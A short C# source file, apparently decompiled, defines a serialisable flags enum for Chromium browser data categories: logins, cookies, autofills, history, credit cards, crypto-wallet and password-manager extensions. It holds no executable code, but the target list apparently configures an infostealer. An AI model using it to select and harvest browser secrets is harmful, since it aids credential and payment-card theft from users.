

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[Flags]
	[ProtoContract]
	public enum ChromiumBrowserOptions
	{
		None = 0,
		Logins = 1,
		Cookies = 2,
		Autofills = 4,
		Downloads = 8,
		History = 16, // 0x00000010
		CreditCards = 32, // 0x00000020
		CryptoExtensions = 64, // 0x00000040
		PasswordManagerExtensions = 128, // 0x00000080
		All = PasswordManagerExtensions | CryptoExtensions | CreditCards | History | Downloads | Autofills | Cookies | Logins, // 0x000000FF
	}
}